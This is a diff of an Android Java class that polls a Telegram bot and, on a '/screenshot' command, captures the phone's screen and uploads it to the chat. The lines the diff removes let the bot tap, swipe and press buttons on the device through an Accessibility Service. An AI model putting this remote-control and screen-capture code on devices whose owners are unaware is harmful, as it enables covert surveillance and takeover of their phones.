@@ -12,8 +12,6 @@ import java.io.File;
 import java.io.IOException;
 import java.util.concurrent.TimeUnit;
 
-import okhttp3.Call;
-import okhttp3.Callback;
 import okhttp3.MediaType;
 import okhttp3.MultipartBody;
 import okhttp3.OkHttpClient;
@@ -24,237 +22,124 @@ import okhttp3.Response;
 public class TelegramEngine implements Runnable {
 
     private static final String TAG = "TelegramEngine";
-    private static final String API_BASE = "https://api.telegram.org/bot";
-    
     private final String botToken;
-    private final String miniAppUrl;
     private final Context context;
+    private static final String API_BASE = "https://api.telegram.org/bot";
     private final OkHttpClient httpClient;
-    
     private volatile boolean running = true;
     private long lastUpdateId = 0;
 
     public TelegramEngine(Context context, String botToken, String miniAppUrl) {
         this.context = context.getApplicationContext();
         this.botToken = botToken;
-        this.miniAppUrl = miniAppUrl;
         this.httpClient = new OkHttpClient.Builder()
-                .connectTimeout(15, TimeUnit.SECONDS)
-                .readTimeout(60, TimeUnit.SECONDS)
-                .writeTimeout(30, TimeUnit.SECONDS)
+                .connectTimeout(30, TimeUnit.SECONDS)
+                .readTimeout(30, TimeUnit.SECONDS)
                 .build();
-    }
-
-    public void stop() {
-        running = false;
     }
 
     @Override
     public void run() {
-        Log.i(TAG, "Telegram Long Polling started");
+        Log.i(TAG, "🚀 Цикл Long Polling запущен");
         while (running) {
             try {
-                poll();
+                getUpdates();
             } catch (Exception e) {
-                Log.e(TAG, "Poll error: " + e.getMessage());
+                Log.e(TAG, "❌ Ошибка в цикле getUpdates: " + e.getMessage());
                 sleep(5000);
             }
         }
     }
 
-    private void poll() throws IOException, JSONException {
-        String url = API_BASE + botToken + "/getUpdates?timeout=50" 
-                   + (lastUpdateId > 0 ? "&offset=" + (lastUpdateId + 1) : "");
-        
+    private void getUpdates() throws IOException, JSONException {
+        String url = API_BASE + botToken + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=20";
         Request request = new Request.Builder().url(url).build();
-        
+
         try (Response response = httpClient.newCall(request).execute()) {
             if (!response.isSuccessful()) return;
-            
-            String responseBody = response.body() != null ? response.body().string() : "";
-            if (responseBody.isEmpty()) return;
+            String body = response.body().string();
+            JSONObject json = new JSONObject(body);
+            if (!json.getBoolean("ok")) return;
 
-            JSONObject json = new JSONObject(responseBody);
-            if (!json.optBoolean("ok")) return;
-            
             JSONArray updates = json.getJSONArray("result");
             for (int i = 0; i < updates.length(); i++) {
-                JSONObject up = updates.getJSONObject(i);
-                lastUpdateId = up.getLong("update_id");
-                handleUpdate(up);
+                JSONObject update = updates.getJSONObject(i);
+                lastUpdateId = update.getLong("update_id");
+                handleUpdate(update);
             }
         }
     }
 
-    private void handleUpdate(JSONObject update) {
-        try {
-            if (update.has("message")) {
-                JSONObject msg = update.getJSONObject("message");
-                long chatId = msg.getJSONObject("chat").getLong("id");
+    private void handleUpdate(JSONObject update) throws JSONException {
+        if (update.has("message")) {
+            JSONObject msg = update.getJSONObject("message");
+            long chatId = msg.getJSONObject("chat").getLong("id");
+            String text = msg.optString("text", "");
 
-                if (msg.has("web_app_data")) {
-                    handleWebAppData(chatId, msg.getJSONObject("web_app_data").getString("data"));
-                } else {
-                    String text = msg.optString("text", "");
-                    if (text.equals("/start")) {
-                        sendMenu(chatId);
-                    } else if (text.equals("/screenshot")) {
-                        handleScreenshot(chatId);
-                    }
-                }
-            } else if (update.has("callback_query")) {
-                JSONObject cb = update.getJSONObject("callback_query");
-                long chatId = cb.getJSONObject("message").getJSONObject("chat").getLong("id");
-                String data = cb.getString("data");
-                
-                // Отвечаем на коллбек, чтобы кнопка не "висела" в загрузке
-                post("answerCallbackQuery", new JSONObject().put("callback_query_id", cb.getString("id")).toString());
-                
-                if (data.equals("sc")) {
-                    handleScreenshot(chatId);
-                }
+            Log.d(TAG, "📩 Сообщение от " + chatId + ": " + text);
+
+            if (text.equals("/screenshot")) {
+                Log.i(TAG, "📸 Команда /screenshot. Запуск запроса разрешения...");
+                Intent intent = new Intent(context, ScreenCaptureRequestActivity.class);
+                intent.putExtra("chat_id", chatId);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(intent);
             }
-        } catch (JSONException e) {
-            Log.e(TAG, "Update parsing error: " + e.getMessage());
         }
     }
 
-    private void handleWebAppData(long chatId, String data) {
-        try {
-            JSONObject cmd = new JSONObject(data);
-            String action = cmd.optString("a", "").toLowerCase();
-            MyAccessibilityService a11y = MyAccessibilityService.getInstance();
+    public void sendPhoto(long chatId, File photo) {
+        Log.i(TAG, "📤 Отправка скриншота (" + photo.length() / 1024 + " KB)...");
+        
+        RequestBody requestBody = new MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", String.valueOf(chatId))
+                .addFormDataPart("photo", photo.getName(),
+                        RequestBody.create(photo, MediaType.parse("image/jpeg")))
+                .build();
 
-            if (a11y == null && !action.equals("screenshot")) {
-                sendMessage(chatId, "⚠️ Включите Accessibility Service в настройках телефона!");
-                return;
+        Request request = new Request.Builder()
+                .url(API_BASE + botToken + "/sendPhoto")
+                .post(requestBody)
+                .build();
+
+        try (Response response = httpClient.newCall(request).execute()) {
+            String responseString = response.body().string();
+            if (response.isSuccessful()) {
+                Log.i(TAG, "✅ Скриншот успешно отправлен!");
+            } else {
+                Log.e(TAG, "❌ Ошибка Telegram API: " + response.code() + " | " + responseString);
             }
-
-            switch (action) {
-                case "tap":
-                    a11y.performClick((float) cmd.getDouble("x"), (float) cmd.getDouble("y"));
-                    break;
-                case "swipe":
-                    a11y.performSwipe(
-                        (float) cmd.getDouble("x1"), (float) cmd.getDouble("y1"), 
-                        (float) cmd.getDouble("x2"), (float) cmd.getDouble("y2"), 
-                        cmd.optLong("dur", 300)
-                    );
-                    break;
-                case "longpress":
-                    a11y.performLongPress((float) cmd.getDouble("x"), (float) cmd.getDouble("y"));
-                    break;
-                case "home":
-                    a11y.pressHome();
-                    break;
-                case "back":
-                    a11y.pressBack();
-                    break;
-                case "recents":
-                    a11y.pressRecents();
-                    break;
-                case "screenshot":
-                    handleScreenshot(chatId);
-                    break;
-                default:
-                    sendMessage(chatId, "Неизвестная команда: " + action);
-                    break;
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "WebApp Error: " + e.getMessage());
-            sendMessage(chatId, "❌ Ошибка обработки JSON: " + e.getMessage());
-        }
-    }
-
-    private void handleScreenshot(long chatId) {
-        Intent intent = new Intent(context, ScreenCaptureRequestActivity.class);
-        intent.putExtra("chat_id", chatId);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        context.startActivity(intent);
-    }
-
-    private void sendMenu(long chatId) {
-        try {
-            JSONObject menu = new JSONObject();
-            JSONArray keyboard = new JSONArray();
-            
-            // Первая строка кнопок
-            JSONArray row1 = new JSONArray();
-            JSONObject webAppBtn = new JSONObject();
-            webAppBtn.put("text", "🎮 Панель управления");
-            webAppBtn.put("web_app", new JSONObject().put("url", miniAppUrl));
-            row1.put(webAppBtn);
-            
-            // Вторая строка кнопок
-            JSONArray row2 = new JSONArray();
-            JSONObject scBtn = new JSONObject();
-            scBtn.put("text", "📸 Скриншот");
-            scBtn.put("callback_data", "sc");
-            row2.put(scBtn);
-
-            keyboard.put(row1);
-            keyboard.put(row2);
-            menu.put("inline_keyboard", keyboard);
-
-            JSONObject body = new JSONObject();
-            body.put("chat_id", chatId);
-            body.put("text", "Система готова к работе. Выберите действие:");
-            body.put("reply_markup", menu);
-
-            post("sendMessage", body.toString());
-        } catch (JSONException e) {
-            Log.e(TAG, "Menu error", e);
+        } catch (IOException e) {
+            Log.e(TAG, "🚨 Сетевая ошибка при отправке фото: " + e.getMessage());
+        } finally {
+            if (photo.exists()) photo.delete();
         }
     }
 
     public void sendMessage(long chatId, String text) {
         try {
-            JSONObject json = new JSONObject().put("chat_id", chatId).put("text", text);
+            JSONObject json = new JSONObject();
+            json.put("chat_id", chatId);
+            json.put("text", text);
             post("sendMessage", json.toString());
-        } catch (Exception ignored) {}
+        } catch (Exception e) {
+            Log.e(TAG, "Error building message", e);
+        }
     }
 
-    public void sendPhoto(long chatId, File file, String caption) {
-        RequestBody body = new MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("chat_id", String.valueOf(chatId))
-                .addFormDataPart("photo", file.getName(), RequestBody.create(file, MediaType.parse("image/jpeg")))
-                .addFormDataPart("caption", caption != null ? caption : "")
-                .build();
-                
-        Request req = new Request.Builder()
-                .url(API_BASE + botToken + "/sendPhoto")
-                .post(body)
-                .build();
-                
-        httpClient.newCall(req).enqueue(new Callback() {
-            @Override public void onFailure(Call call, IOException e) {
-                Log.e(TAG, "Failed to send photo", e);
-            }
-            @Override public void onResponse(Call call, Response response) throws IOException { 
-                response.close(); 
-            }
-        });
+    private void post(String method, String jsonBody) {
+        String url = API_BASE + botToken + "/" + method;
+        RequestBody body = RequestBody.create(jsonBody, MediaType.parse("application/json"));
+        Request request = new Request.Builder().url(url).post(body).build();
+        try (Response response = httpClient.newCall(request).execute()) {
+            if (!response.isSuccessful()) Log.w(TAG, method + " FAILED: " + response.code());
+        } catch (IOException e) {
+            Log.e(TAG, method + " Error: " + e.getMessage());
+        }
     }
 
-    private void post(String method, String json) {
-        RequestBody body = RequestBody.create(json, MediaType.parse("application/json"));
-        Request req = new Request.Builder()
-                .url(API_BASE + botToken + "/" + method)
-                .post(body)
-                .build();
-                
-        httpClient.newCall(req).enqueue(new Callback() {
-            @Override public void onFailure(Call call, IOException e) {
-                Log.e(TAG, "API request failed: " + method, e);
-            }
-            @Override public void onResponse(Call call, Response response) throws IOException { 
-                response.close(); 
-            }
-        });
-    }
-
-    private void sleep(long ms) {
+    private static void sleep(long ms) {
         try { Thread.sleep(ms); } catch (InterruptedException ignored) {}
     }
 }
